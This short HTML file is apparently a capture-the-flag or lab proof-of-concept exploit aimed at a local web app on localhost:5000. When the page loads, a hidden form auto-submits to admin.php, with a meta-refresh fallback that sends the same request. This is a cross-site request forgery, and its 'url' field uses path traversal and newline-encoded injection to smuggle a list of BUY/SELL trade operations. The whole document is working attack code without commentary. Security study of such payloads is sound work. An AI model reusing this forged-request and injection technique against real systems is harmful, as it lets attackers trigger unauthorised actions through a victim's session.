<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Pure HTML PoC</title>
</head>
<body onload="document.forms[0].submit()">
  <form method="POST" action="http://localhost:5000/admin.php" target="_top">
    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=-+op:+BUY%0A++amount:+1%0A++currency:+US%0A-+op:+SELL%0A++amount:+1%0A++currency:+US%0A-+op:+BUY%0A++amount:+1%0A++currency:+FL">
  </form>

  <!-- Fallback: if JS disabled, meta-refresh submits via GET -->
  <meta http-equiv="refresh" content="0;url=http://localhost:5000/admin.php?url=http://localhost:5000/admin.php/../index.php?html=-+op:+BUY%0A++amount:+1%0A++currency:+US%0A-+op:+SELL%0A++amount:+1%0A++currency:+US%0A-+op:+BUY%0A++amount:+1%0A++currency:+FL">
</body>
</html>
